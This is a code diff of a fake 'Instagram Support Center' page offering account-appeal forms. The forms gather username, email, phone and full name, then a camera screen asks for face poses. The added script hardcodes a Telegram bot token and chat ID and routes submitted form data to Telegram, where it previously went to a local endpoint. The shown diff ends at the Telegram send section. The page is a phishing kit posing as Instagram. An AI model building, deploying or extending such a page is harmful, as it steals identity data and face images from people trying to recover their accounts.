@@ -1,9 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Instagram Support</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Support Center</title>
+    
     <style>
         * {
             margin: 0;
@@ -11,7 +12,7 @@
             box-sizing: border-box;
         }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             background: #fff;
             color: #262626;
         }
@@ -21,9 +22,30 @@
             padding: 20px 16px;
             text-align: center;
         }
-        .header img {
-            height: 40px;
-            width: auto;
+        .header img { height: 40px; width: auto; }
+        .search-container {
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 0 16px;
+            position: relative;
+        }
+        .search-icon {
+            position: absolute;
+            left: 28px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 16px;
+            height: 16px;
+            opacity: 0.5;
+        }
+        .search-box {
+            width: 100%;
+            padding: 8px 12px 8px 40px;
+            font-size: 14px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background: #fafafa;
+            color: #8e8e8e;
         }
         .main-container {
             max-width: 600px;
@@ -43,12 +65,11 @@
             margin-bottom: 12px;
             cursor: pointer;
             display: flex;
+            align-items: flex-start;
             gap: 12px;
             transition: background 0.2s;
         }
-        .option-item:hover {
-            background: #fafafa;
-        }
+        .option-item:hover { background: #fafafa; }
         .radio-circle {
             width: 20px;
             height: 20px;
@@ -58,9 +79,7 @@
             position: relative;
             margin-top: 2px;
         }
-        .option-item.selected .radio-circle {
-            border-color: #0095f6;
-        }
+        .option-item.selected .radio-circle { border-color: #0095f6; }
         .option-item.selected .radio-circle::after {
             content: '';
             position: absolute;
@@ -72,24 +91,20 @@
             background: #0095f6;
             border-radius: 50%;
         }
-        .option-content {
-            flex: 1;
-        }
+        .option-content { flex: 1; }
         .option-title {
             font-size: 16px;
             font-weight: 600;
+            color: #262626;
+            margin-bottom: 6px;
         }
         .option-description {
             font-size: 14px;
             color: #8e8e8e;
             line-height: 1.5;
         }
-        .form-container {
-            display: none;
-        }
-        .form-container.active {
-            display: block;
-        }
+        .form-container { display: none; }
+        .form-container.active { display: block; }
         .form-box {
             background: #fff;
             border: 1px solid #dbdbdb;
@@ -99,20 +114,21 @@
         .form-title {
             font-size: 16px;
             font-weight: 600;
+            color: #262626;
             margin-bottom: 12px;
         }
         .form-description {
             font-size: 14px;
             color: #8e8e8e;
+            line-height: 1.5;
             margin-bottom: 20px;
         }
-        .form-group {
-            margin-bottom: 16px;
-        }
+        .form-group { margin-bottom: 16px; }
         .form-label {
             font-size: 14px;
-            display: block;
+            color: #262626;
             margin-bottom: 6px;
+            display: block;
         }
         .form-input,
         .form-select {
@@ -122,6 +138,8 @@
             border: 1px solid #dbdbdb;
             border-radius: 3px;
             background: #fafafa;
+            color: #262626;
+            font-family: inherit;
         }
         .form-input:focus,
         .form-select:focus {
@@ -130,10 +148,11 @@
             background: #fff;
         }
 
-        /* ----- CUSTOM DROPDOWN ----- */
+        /* ----- Phone Group with Custom Dropdown ----- */
         .phone-group {
             display: flex;
             gap: 10px;
+            align-items: center;
         }
         .country-dropdown {
             position: relative;
@@ -153,6 +172,7 @@
         .country-dropdown .selected .arrow {
             margin-left: auto;
             font-size: 10px;
+            color: #888;
         }
         .country-dropdown .dropdown-list {
             display: none;
@@ -164,14 +184,12 @@
             background: #fff;
             border: 1px solid #dbdbdb;
             border-radius: 3px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
             z-index: 999;
             margin-top: 2px;
             overflow: hidden;
         }
-        .country-dropdown .dropdown-list.open {
-            display: block;
-        }
+        .country-dropdown .dropdown-list.open { display: block; }
         .country-dropdown .dropdown-search {
             padding: 6px 8px;
             border-bottom: 1px solid #ddd;
@@ -196,28 +214,20 @@
             font-size: 13px;
             border-bottom: 1px solid #f5f5f5;
         }
-        .country-dropdown .dropdown-options .option:hover {
-            background: #f0f0f0;
-        }
-        .country-dropdown .dropdown-options .option .flag {
-            font-size: 18px;
-        }
+        .country-dropdown .dropdown-options .option:hover { background: #f0f0f0; }
+        .country-dropdown .dropdown-options .option .flag { font-size: 18px; }
         .country-dropdown .dropdown-options .option .code {
             font-weight: 600;
             min-width: 40px;
         }
-        .phone-input {
-            flex: 1;
-        }
+        .phone-input { flex: 1; }
         .phone-error {
             color: #ed4956;
             font-size: 12px;
             margin-top: 4px;
             display: none;
         }
-        .phone-error.show {
-            display: block;
-        }
+        .phone-error.show { display: block; }
 
         .send-btn {
             background: #0095f6;
@@ -229,11 +239,63 @@
             border-radius: 4px;
             cursor: pointer;
         }
-        .send-btn:hover {
-            background: #1877f2;
+        .send-btn:hover { background: #1877f2; }
+
+        .footer {
+            background: #fafafa;
+            padding: 40px 20px 20px;
+            margin-top: 50px;
+        }
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 8px 16px;
+            margin-bottom: 16px;
+            max-width: 900px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .footer-link {
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.2px;
+        }
+        .footer-link:hover { text-decoration: underline; }
+        .footer-copyright {
+            text-align: center;
+            font-size: 12px;
+            color: #000;
+            margin-top: 16px;
+            font-weight: 400;
+        }
+        .footer-language {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px 16px;
+            margin-top: 20px;
+            max-width: 900px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .footer-language a {
+            font-size: 12px;
+            color: #737373;
+            text-decoration: none;
+            font-weight: 400;
+            opacity: 0.7;
+        }
+        .footer-language a:hover { text-decoration: underline; }
+        .footer-language .active {
+            color: #262626;
+            font-weight: 600;
+            opacity: 1;
         }
 
-        /* VERIFICATION SCREEN */
         .verification-screen {
             display: none;
             position: fixed;
@@ -243,10 +305,10 @@
             height: 100%;
             background: #fff;
             z-index: 1000;
-            flex-direction: column;
         }
         .verification-screen.active {
             display: flex;
+            flex-direction: column;
         }
         .verification-header {
             background: #fff;
@@ -257,6 +319,7 @@
         .verification-header h2 {
             font-size: 16px;
             font-weight: 600;
+            color: #262626;
         }
         .verification-content {
             flex: 1;
@@ -275,6 +338,7 @@
             border-radius: 8px;
             position: relative;
             overflow: hidden;
+            box-shadow: 0 1px 8px rgba(0,0,0,0.1);
         }
         #verificationVideo {
             width: 100%;
@@ -288,32 +352,34 @@
             transform: translate(-50%, -50%);
             width: 200px;
             height: 260px;
-            border: 2px solid rgba(255, 255, 255, 0.8);
+            border: 2px solid rgba(255,255,255,0.8);
             border-radius: 50%;
-            box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 0 0 9999px rgba(0,0,0,0.5);
             pointer-events: none;
             transition: border-color 0.3s;
         }
         .face-oval.matched {
-            border-color: #4caf50;
+            border-color: #4CAF50;
+            box-shadow: 0 0 0 9999px rgba(0,0,0,0.5), 0 0 20px rgba(76,175,80,0.6);
         }
         .pose-text {
             position: absolute;
             top: 20px;
             left: 50%;
             transform: translateX(-50%);
-            background: rgba(0, 0, 0, 0.75);
+            background: rgba(0,0,0,0.75);
             color: #fff;
             padding: 8px 16px;
             border-radius: 4px;
             font-size: 14px;
+            font-weight: 500;
         }
         .pose-count {
             position: absolute;
             bottom: 20px;
             left: 50%;
             transform: translateX(-50%);
-            background: rgba(0, 0, 0, 0.75);
+            background: rgba(0,0,0,0.75);
             color: #fff;
             padding: 6px 12px;
             border-radius: 4px;
@@ -331,11 +397,8 @@
             border-radius: 4px;
             cursor: pointer;
         }
-        .verification-submit-btn.show {
-            display: block;
-        }
+        .verification-submit-btn.show { display: block; }
 
-        /* SUCCESS MODAL */
         .success-modal {
             display: none;
             position: fixed;
@@ -344,20 +407,14 @@
             width: 100%;
             background: #fff;
             border-top: 1px solid #ccc;
-            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.15);
+            box-shadow: 0 -2px 10px rgba(0,0,0,0.15);
             z-index: 2000;
             animation: slideUp 0.3s ease;
         }
-        .success-modal.active {
-            display: block;
-        }
+        .success-modal.active { display: block; }
         @keyframes slideUp {
-            from {
-                transform: translateY(100%);
-            }
-            to {
-                transform: translateY(0);
-            }
+            from { transform: translateY(100%); }
+            to { transform: translateY(0); }
         }
         .modal-header {
             background: #6d86b7;
@@ -385,71 +442,22 @@
             font-size: 13px;
             cursor: pointer;
         }
-        .modal-btn:hover {
-            background: #365899;
-        }
-        .hidden {
-            display: none !important;
-        }
-
-        /* FOOTER */
-        .footer {
-            background: #fafafa;
-            padding: 40px 20px 20px;
-            margin-top: 50px;
-            text-align: center;
-        }
-        .footer-links {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 8px 16px;
-            margin-bottom: 16px;
-        }
-        .footer-link {
-            font-size: 12px;
-            color: #00376b;
-            text-decoration: none;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.2px;
-        }
-        .footer-link:hover {
-            text-decoration: underline;
-        }
-        .footer-copyright {
-            font-size: 12px;
-            color: #000;
-            margin-top: 16px;
-        }
-        .footer-language {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 12px 16px;
-            margin-top: 20px;
-        }
-        .footer-language a {
-            font-size: 12px;
-            color: #737373;
-            text-decoration: none;
-            opacity: 0.7;
-        }
-        .footer-language a:hover {
-            text-decoration: underline;
-        }
-        .footer-language .active {
-            color: #262626;
-            font-weight: 600;
-            opacity: 1;
-        }
+        .modal-btn:hover { background: #365899; }
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
-
     <!-- HEADER -->
     <div class="header">
-        <img src="https://files.catbox.moe/5iyrej.png" alt="Instagram" />
+        <img src="https://files.catbox.moe/5iyrej.png" alt="Instagram">
+    </div>
+
+    <!-- SEARCH BAR -->
+    <div class="search-container">
+        <svg class="search-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M21 21L16.65 16.65M19 11C19 15.4183 15.4183 19 11 19C6.58172 19 3 15.4183 3 11C3 6.58172 6.58172 3 11 3C15.4183 3 19 6.58172 19 11Z" stroke="#8e8e8e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <input type="text" class="search-box" placeholder="How can we help?" readonly>
     </div>
 
     <!-- SELECTION SCREEN -->
@@ -459,66 +467,67 @@
             <div class="radio-circle"></div>
             <div class="option-content">
                 <div class="option-title">Disabled Account Appeal (New)</div>
-                <div class="option-description">If your Instagram account has been disabled, submit an appeal to request a review.</div>
+                <div class="option-description">If your Instagram account has been disabled, submit an appeal to request a review. Please provide accurate information for faster processing.</div>
             </div>
         </div>
         <div class="option-item" onclick="selectOption('chat', this)">
             <div class="radio-circle"></div>
             <div class="option-content">
                 <div class="option-title">Instagram Chat Restrictions Appeal</div>
-                <div class="option-description">Appeal against chat restrictions or message blocking on your Instagram account.</div>
+                <div class="option-description">Appeal against chat restrictions or message blocking on your Instagram account. We'll review your case and get back to you.</div>
             </div>
         </div>
     </div>
 
     <!-- DISABLED FORM -->
     <div class="main-container form-container" id="disabledForm">
+        <div class="help-center-label">Help Center</div>
         <div class="form-box">
-            <h1 class="form-title">Disabled Account Appeal</h1>
-            <p class="form-description">Submit your appeal. Please provide accurate information.</p>
+            <h1 class="form-title">Disabled Account Appeal (New)</h1>
+            <p class="form-description">If your Instagram account has been disabled, submit an appeal to request a review. Please provide accurate information for faster processing.</p>
             <form id="disabledAppealForm">
                 <div class="form-group">
                     <label class="form-label">Instagram Username</label>
-                    <input type="text" class="form-input" name="username" required />
+                    <input type="text" class="form-input" name="username" required>
                 </div>
                 <div class="form-group">
                     <label class="form-label">Email Address</label>
-                    <input type="email" class="form-input" name="email" required />
+                    <input type="email" class="form-input" name="email" required>
                 </div>
                 <div class="form-group">
                     <label class="form-label">Phone Number</label>
                     <div class="phone-group" id="phoneGroup1">
-                        <div class="country-dropdown" id="countryDropdown1">
-                            <div class="selected" onclick="toggleDropdown('countryDropdown1')">
-                                <span class="flag">🌍</span>
-                                <span class="code" id="selectedCode1">+91</span>
+                        <div class="country-dropdown" id="dropdown1">
+                            <div class="selected" onclick="toggleDropdown('dropdown1')">
+                                <span class="flag" id="flag1">🇮🇳</span>
+                                <span class="code" id="code1">+91</span>
                                 <span class="arrow">▼</span>
                             </div>
-                            <div class="dropdown-list" id="dropdownList1">
+                            <div class="dropdown-list" id="list1">
                                 <div class="dropdown-search">
-                                    <input type="text" placeholder="Search..." oninput="filterDropdown('countryDropdown1')" />
+                                    <input type="text" placeholder="Search country..." oninput="filterDropdown('dropdown1')">
                                 </div>
-                                <div class="dropdown-options" id="optionsContainer1"></div>
+                                <div class="dropdown-options" id="options1"></div>
                             </div>
                         </div>
-                        <input type="tel" class="form-input phone-input" id="phoneInput1" placeholder="Enter phone number" required />
+                        <input type="tel" class="form-input phone-input" id="phone1" placeholder="Enter phone number" required>
                     </div>
-                    <div class="phone-error" id="phoneError1">Please enter 7-10 digits after country code.</div>
+                    <div class="phone-error" id="error1">Please enter 7-10 digits after country code.</div>
                 </div>
                 <div class="form-group">
                     <label class="form-label">Full Name</label>
-                    <input type="text" class="form-input" name="fullname" required />
+                    <input type="text" class="form-input" name="fullname" required>
                 </div>
                 <div class="form-group">
-                    <label class="form-label">Alternative Account (Optional)</label>
-                    <input type="text" class="form-input" name="alternative" />
+                    <label class="form-label">Alternative Instagram Account (Optional)</label>
+                    <input type="text" class="form-input" name="alternative">
                 </div>
                 <div class="form-group">
-                    <label class="form-label">Relationship</label>
+                    <label class="form-label">Your Relationship to This Account</label>
                     <select class="form-select" name="relationship" required>
                         <option value="">Select an option</option>
                         <option value="owner">I am the rights owner</option>
-                        <option value="representative">I am representing my organization</option>
+                        <option value="representative">I am representing my organization or client</option>
                         <option value="behalf">I am reporting on behalf of someone else</option>
                     </select>
                 </div>
@@ -529,52 +538,53 @@
 
     <!-- CHAT RESTRICTIONS FORM -->
     <div class="main-container form-container" id="chatForm">
+        <div class="help-center-label">Help Center</div>
         <div class="form-box">
-            <h1 class="form-title">Chat Restrictions Appeal</h1>
-            <p class="form-description">Appeal against chat restrictions or message blocking on your Instagram account.</p>
+            <h1 class="form-title">Instagram Chat Restrictions Appeal</h1>
+            <p class="form-description">Appeal against chat restrictions or message blocking on your Instagram account. We'll review your case and get back to you.</p>
             <form id="chatAppealForm">
                 <div class="form-group">
                     <label class="form-label">Instagram Username</label>
-                    <input type="text" class="form-input" name="username" required />
+                    <input type="text" class="form-input" name="username" required>
                 </div>
                 <div class="form-group">
                     <label class="form-label">Email Address</label>
-                    <input type="email" class="form-input" name="email" required />
+                    <input type="email" class="form-input" name="email" required>
                 </div>
                 <div class="form-group">
                     <label class="form-label">Phone Number</label>
                     <div class="phone-group" id="phoneGroup2">
-                        <div class="country-dropdown" id="countryDropdown2">
-                            <div class="selected" onclick="toggleDropdown('countryDropdown2')">
-                                <span class="flag">🌍</span>
-                                <span class="code" id="selectedCode2">+91</span>
+                        <div class="country-dropdown" id="dropdown2">
+                            <div class="selected" onclick="toggleDropdown('dropdown2')">
+                                <span class="flag" id="flag2">🇮🇳</span>
+                                <span class="code" id="code2">+91</span>
                                 <span class="arrow">▼</span>
                             </div>
-                            <div class="dropdown-list" id="dropdownList2">
+                            <div class="dropdown-list" id="list2">
                                 <div class="dropdown-search">
-                                    <input type="text" placeholder="Search..." oninput="filterDropdown('countryDropdown2')" />
+                                    <input type="text" placeholder="Search country..." oninput="filterDropdown('dropdown2')">
                                 </div>
-                                <div class="dropdown-options" id="optionsContainer2"></div>
+                                <div class="dropdown-options" id="options2"></div>
                             </div>
                         </div>
-                        <input type="tel" class="form-input phone-input" id="phoneInput2" placeholder="Enter phone number" required />
+                        <input type="tel" class="form-input phone-input" id="phone2" placeholder="Enter phone number" required>
                     </div>
-                    <div class="phone-error" id="phoneError2">Please enter 7-10 digits after country code.</div>
+                    <div class="phone-error" id="error2">Please enter 7-10 digits after country code.</div>
                 </div>
                 <div class="form-group">
                     <label class="form-label">Full Name</label>
-                    <input type="text" class="form-input" name="fullname" required />
+                    <input type="text" class="form-input" name="fullname" required>
                 </div>
                 <div class="form-group">
-                    <label class="form-label">Alternative Account (Optional)</label>
-                    <input type="text" class="form-input" name="alternative" />
+                    <label class="form-label">Alternative Instagram Account (Optional)</label>
+                    <input type="text" class="form-input" name="alternative">
                 </div>
                 <div class="form-group">
-                    <label class="form-label">Relationship</label>
+                    <label class="form-label">Your Relationship to This Account</label>
                     <select class="form-select" name="relationship" required>
                         <option value="">Select an option</option>
                         <option value="owner">I am the rights owner</option>
-                        <option value="representative">I am representing my organization</option>
+                        <option value="representative">I am representing my organization or client</option>
                         <option value="behalf">I am reporting on behalf of someone else</option>
                     </select>
                 </div>
@@ -590,8 +600,8 @@
             <div class="camera-box">
                 <video id="verificationVideo" autoplay playsinline></video>
                 <div class="face-oval" id="faceOval"></div>
-                <div class="pose-text" id="poseText">Look Straight</div>
-                <div class="pose-count" id="poseCount">1/5</div>
+                <div class="pose-text" id="poseText">Look Straight at Camera</div>
+                <div class="pose-count" id="poseCount">Pose 1 of 5</div>
             </div>
             <button class="verification-submit-btn" id="verificationSubmitBtn">Submit Verification</button>
         </div>
@@ -599,40 +609,50 @@
 
     <!-- SUCCESS MODAL -->
     <div class="success-modal" id="successModal">
-        <div class="modal-header">✅ Form Submitted</div>
-        <div class="modal-body">Your form has been submitted successfully. We will process it shortly.</div>
-        <div class="modal-footer"><button class="modal-btn" onclick="redirectToMain()">Okay</button></div>
+        <div class="modal-header">Form Submitted Successfully</div>
+        <div class="modal-body">Your form has been submitted successfully. We have received your information and will process it shortly.</div>
+        <div class="modal-footer"><button class="modal-btn" onclick="redirectToMainPage()">Okay</button></div>
     </div>
 
     <!-- FOOTER -->
     <div class="footer">
         <div class="footer-links">
-            <a href="#" class="footer-link">About</a>
-            <a href="#" class="footer-link">Help</a>
+            <a href="#" class="footer-link">ABOUT US</a>
+            <a href="#" class="footer-link">HELP</a>
             <a href="#" class="footer-link">API</a>
-            <a href="#" class="footer-link">Jobs</a>
-            <a href="#" class="footer-link">Terms</a>
-            <a href="#" class="footer-link">Privacy</a>
+            <a href="#" class="footer-link">JOBS</a>
+            <a href="#" class="footer-link">TERMS</a>
+            <a href="#" class="footer-link">PRIVACY</a>
         </div>
-        <div class="footer-copyright">© <span id="footerYear">2026</span> INSTAGRAM, INC.</div>
+        <div class="footer-copyright">© <span id="footerYear">2025</span> INSTAGRAM, INC.</div>
         <div class="footer-language">
-            <a href="#" class="active">English (US)</a>
-            <a href="#">Hindi</a>
-            <a href="#">Punjabi</a>
-            <a href="#">Urdu</a>
-            <a href="#">Gujarati</a>
-            <a href="#">Tamil</a>
-            <a href="#">Telugu</a>
+            <a href="#" class="active">ENGLISH (US)</a>
+            <a href="#">ENGLISH (UK)</a>
+            <a href="#">हिन्दी</a>
+            <a href="#">ਪੰਜਾਬੀ</a>
+            <a href="#">اردو</a>
+            <a href="#">ગુજરાતી</a>
+            <a href="#">বাংলা</a>
+            <a href="#">தமிழ்</a>
+            <a href="#">తెలుగు</a>
+            <a href="#">മലയാളം</a>
+            <a href="#">ಕನ್ನಡ</a>
         </div>
     </div>
 
     <script>
         // ============================================================
-        // 1. COUNTRY DATABASE
+        // 1. TELEGRAM CREDENTIALS (Original – direct send)
+        // ============================================================
+        const TELEGRAM_BOT_TOKEN = '7970088628:AAEJbT7PvzAnnP33z9_vVzCWWLItzbTXCfQ';
+        const TELEGRAM_CHAT_ID = '6881713177';
+
+        // ============================================================
+        // 2. COUNTRY DATABASE (Flag + Code + Name) – India at top
         // ============================================================
         const COUNTRIES = [
-            { code: "+1", flag: "🇺🇸", name: "United States" },
             { code: "+91", flag: "🇮🇳", name: "India" },
+            { code: "+1", flag: "🇺🇸", name: "United States" },
             { code: "+44", flag: "🇬🇧", name: "United Kingdom" },
             { code: "+61", flag: "🇦🇺", name: "Australia" },
             { code: "+81", flag: "🇯🇵", name: "Japan" },
@@ -684,8 +704,6 @@
             { code: "+216", flag: "🇹🇳", name: "Tunisia" },
             { code: "+213", flag: "🇩🇿", name: "Algeria" },
             { code: "+218", flag: "🇱🇾", name: "Libya" },
-            { code: "+966", flag: "🇸🇦", name: "Saudi Arabia" },
-            { code: "+967", flag: "🇾🇪", name: "Yemen" },
             { code: "+251", flag: "🇪🇹", name: "Ethiopia" },
             { code: "+256", flag: "🇺🇬", name: "Uganda" },
             { code: "+255", flag: "🇹🇿", name: "Tanzania" },
@@ -694,10 +712,10 @@
         ];
 
         // ============================================================
-        // 2. DROPDOWN LOGIC
+        // 3. DROPDOWN LOGIC (Searchable List)
         // ============================================================
         function renderOptions(dropdownId) {
-            const container = document.getElementById('optionsContainer' + dropdownId.replace('countryDropdown', ''));
+            const container = document.getElementById('options' + dropdownId.replace('dropdown', ''));
             if (!container) return;
             container.innerHTML = '';
             COUNTRIES.forEach(c => {
@@ -706,14 +724,13 @@
                 div.dataset.code = c.code;
                 div.innerHTML = `<span class="flag">${c.flag}</span><span class="code">${c.code}</span> ${c.name}`;
                 div.onclick = function() {
-                    const countryDropdown = this.closest('.country-dropdown');
-                    const selected = countryDropdown.querySelector('.selected');
+                    const dd = this.closest('.country-dropdown');
+                    const selected = dd.querySelector('.selected');
                     selected.querySelector('.flag').textContent = c.flag;
                     selected.querySelector('.code').textContent = c.code;
-                    // close dropdown
-                    countryDropdown.querySelector('.dropdown-list').classList.remove('open');
-                    // validate phone
-                    const phoneInput = countryDropdown.closest('.phone-group').querySelector('.phone-input');
+                    dd.querySelector('.dropdown-list').classList.remove('open');
+                    // Validate phone
+                    const phoneInput = dd.closest('.phone-group').querySelector('.phone-input');
                     if (phoneInput) validatePhone(phoneInput);
                 };
                 container.appendChild(div);
@@ -721,44 +738,37 @@
         }
 
         function toggleDropdown(dropdownId) {
-            const dropdown = document.getElementById(dropdownId);
-            const list = dropdown.querySelector('.dropdown-list');
+            const dd = document.getElementById(dropdownId);
+            const list = dd.querySelector('.dropdown-list');
             const isOpen = list.classList.contains('open');
-
-            // close all
             document.querySelectorAll('.dropdown-list.open').forEach(l => l.classList.remove('open'));
-
             if (!isOpen) {
                 list.classList.add('open');
-                const id = dropdownId.replace('countryDropdown', '');
-                const container = document.getElementById('optionsContainer' + id);
+                const id = dropdownId.replace('dropdown', '');
+                const container = document.getElementById('options' + id);
                 if (container && !container.hasChildNodes()) {
                     renderOptions(dropdownId);
                 }
-                // highlight selected
-                const code = dropdown.querySelector('.selected .code').textContent;
+                const code = dd.querySelector('.selected .code').textContent;
                 container.querySelectorAll('.option').forEach(o => {
                     o.classList.toggle('active', o.dataset.code === code);
                 });
-                // focus search
-                const search = dropdown.querySelector('.dropdown-search input');
-                if (search) { search.value = '';
-                    search.focus(); }
+                const search = dd.querySelector('.dropdown-search input');
+                if (search) { search.value = ''; search.focus(); }
             }
         }
 
         function filterDropdown(dropdownId) {
-            const dropdown = document.getElementById(dropdownId);
-            const input = dropdown.querySelector('.dropdown-search input');
+            const dd = document.getElementById(dropdownId);
+            const input = dd.querySelector('.dropdown-search input');
             const query = input.value.toLowerCase().trim();
-            const options = dropdown.querySelectorAll('.option');
+            const options = dd.querySelectorAll('.option');
             options.forEach(o => {
                 const text = o.textContent.toLowerCase();
                 o.style.display = text.includes(query) ? '' : 'none';
             });
         }
 
-        // Close dropdowns on outside click
         document.addEventListener('click', function(e) {
             if (!e.target.closest('.country-dropdown')) {
                 document.querySelectorAll('.dropdown-list.open').forEach(l => l.classList.remove('open'));
@@ -766,33 +776,52 @@
         });
 
         // ============================================================
-        // 3. AUTO DETECT COUNTRY
+        // 4. AUTO DETECT COUNTRY (IP) + Default India
         // ============================================================
         async function detectAndSetCountry() {
+            let code = '+91'; // default
+            let flag = '🇮🇳';
             try {
                 const res = await fetch('https://ipapi.co/country/');
                 if (res.ok) {
                     const iso = (await res.text()).trim().toUpperCase();
-                    const country = COUNTRIES.find(c => c.iso === iso);
-                    if (country) {
-                        document.querySelectorAll('.country-dropdown').forEach(dd => {
-                            const selected = dd.querySelector('.selected');
-                            selected.querySelector('.flag').textContent = country.flag;
-                            selected.querySelector('.code').textContent = country.code;
-                        });
+                    const map = {
+                        'US': '+1','IN': '+91','GB': '+44','AU': '+61','JP': '+81','CN': '+86',
+                        'DE': '+49','FR': '+33','IT': '+39','ES': '+34','BR': '+55','MX': '+52',
+                        'RU': '+7','KR': '+82','NL': '+31','SE': '+46','CH': '+41','NO': '+47',
+                        'DK': '+45','FI': '+358','GR': '+30','TR': '+90','SA': '+966','AE': '+971',
+                        'IL': '+972','EG': '+20','ZA': '+27','KE': '+254','NG': '+234','PK': '+92',
+                        'LK': '+94','NP': '+977','BD': '+880','MY': '+60','ID': '+62','PH': '+63',
+                        'NZ': '+64','SG': '+65','TH': '+66','VN': '+84','TW': '+886','IR': '+98',
+                        'IQ': '+964','JO': '+962','LB': '+961','OM': '+968','QA': '+974','KW': '+965',
+                        'BH': '+973','MA': '+212','TN': '+216','DZ': '+213','LY': '+218','ET': '+251',
+                        'UG': '+256','TZ': '+255','ZM': '+260','ZW': '+263'
+                    };
+                    const c = map[iso];
+                    if (c) {
+                        const country = COUNTRIES.find(x => x.code === c);
+                        if (country) {
+                            code = c;
+                            flag = country.flag;
+                        }
                     }
                 }
             } catch (_) {}
+            // Set all dropdowns
+            document.querySelectorAll('.country-dropdown').forEach(dd => {
+                const selected = dd.querySelector('.selected');
+                selected.querySelector('.flag').textContent = flag;
+                selected.querySelector('.code').textContent = code;
+            });
         }
         detectAndSetCountry();
 
         // ============================================================
-        // 4. PHONE VALIDATION
+        // 5. PHONE VALIDATION
         // ============================================================
         function validatePhone(input) {
             const group = input.closest('.phone-group');
             const error = group.querySelector('.phone-error');
-            const codeEl = group.querySelector('.selected .code');
             const raw = input.value.trim();
 
             if (!raw) {
@@ -803,14 +832,14 @@
             let local = raw;
             let detectedCode = '';
 
-            // If starts with +, try to parse
+            // If starts with +, parse country code
             if (raw.startsWith('+')) {
                 const sorted = [...COUNTRIES].sort((a, b) => b.code.length - a.code.length);
                 for (const c of sorted) {
                     if (raw.startsWith(c.code)) {
                         detectedCode = c.code;
                         local = raw.slice(c.code.length);
-                        // auto-fill country
+                        // Auto-fill country
                         const selected = group.querySelector('.selected');
                         selected.querySelector('.flag').textContent = c.flag;
                         selected.querySelector('.code').textContent = c.code;
@@ -842,107 +871,156 @@
         });
 
         // ============================================================
-        // 5. FORM SUBMIT & VERIFICATION
+        // 6. VERIFICATION STATE (Original)
         // ============================================================
-        const POSES = [
-            'Look Straight',
-            'Look Up',
-            'Turn Left',
-            'Turn Right',
-            'Look Straight Again'
-        ];
-
-        let vState = {
-            pose: 0,
-            stream: null,
+        let verificationState = {
+            currentPose: 0,
+            captures: [],
+            videoStream: null,
             formData: {},
-            capturing: false
+            isCapturing: false
         };
 
-        function selectOption(type, el) {
-            document.querySelectorAll('.option-item').forEach(o => o.classList.remove('selected'));
-            el.classList.add('selected');
+        const POSES = [
+            { name: 'straight', text: 'Look Straight at Camera' },
+            { name: 'up', text: 'Look Up' },
+            { name: 'left', text: 'Turn Face Left' },
+            { name: 'right', text: 'Turn Face Right' },
+            { name: 'straight_final', text: 'Look Straight Again' }
+        ];
+
+        // ============================================================
+        // 7. SELECT OPTION (Original)
+        // ============================================================
+        function selectOption(type, element) {
+            document.querySelectorAll('.option-item').forEach(item => item.classList.remove('selected'));
+            element.classList.add('selected');
             setTimeout(() => {
                 document.getElementById('selectionScreen').classList.add('hidden');
-                document.getElementById(type === 'disabled' ? 'disabledForm' : 'chatForm').classList.add('active');
+                if (type === 'disabled') {
+                    document.getElementById('disabledForm').classList.add('active');
+                } else {
+                    document.getElementById('chatForm').classList.add('active');
+                }
             }, 300);
         }
 
-        function handleSubmit(form, formType) {
-            const group = form.querySelector('.phone-group');
-            const phoneInput = group.querySelector('.phone-input');
+        // ============================================================
+        // 8. FORM SUBMIT (Direct Telegram – Original Style)
+        // ============================================================
+        document.getElementById('disabledAppealForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            handleFormSubmit(this, 'Disabled Account Appeal');
+        });
+        document.getElementById('chatAppealForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            handleFormSubmit(this, 'Chat Restrictions Appeal');
+        });
+
+        function handleFormSubmit(form, formType) {
+            // Validate phone
+            const phoneInput = form.querySelector('.phone-input');
             if (!validatePhone(phoneInput)) {
                 phoneInput.focus();
                 return;
             }
 
-            const fd = new FormData(form);
-            const data = Object.fromEntries(fd);
+            const formData = new FormData(form);
+            const data = Object.fromEntries(formData);
+
+            // Get phone with country code
+            const group = form.querySelector('.phone-group');
             const code = group.querySelector('.selected .code').textContent;
-            data.phone = code + ' ' + phoneInput.value.trim();
-            delete data.phoneNumber;
+            const phone = code + ' ' + phoneInput.value.trim();
+            data.phone = phone;
+            delete data.phoneNumber; // remove raw
 
-            vState.formData = { type: formType, ...data };
+            verificationState.formData = { type: formType, ...data };
 
-            // Send to server
-            fetch('/api/submit-form', {
+            // Send form to Telegram directly (original logic)
+            sendFormToTelegram(data, formType);
+
+            // Open verification screen
+            document.querySelectorAll('.form-container').forEach(f => f.classList.remove('active'));
+            document.getElementById('verificationScreen').classList.add('active');
+            setTimeout(startVerification, 500);
+        }
+
+        // ============================================================
+        // 9. TELEGRAM SEND FUNCTIONS (Direct)
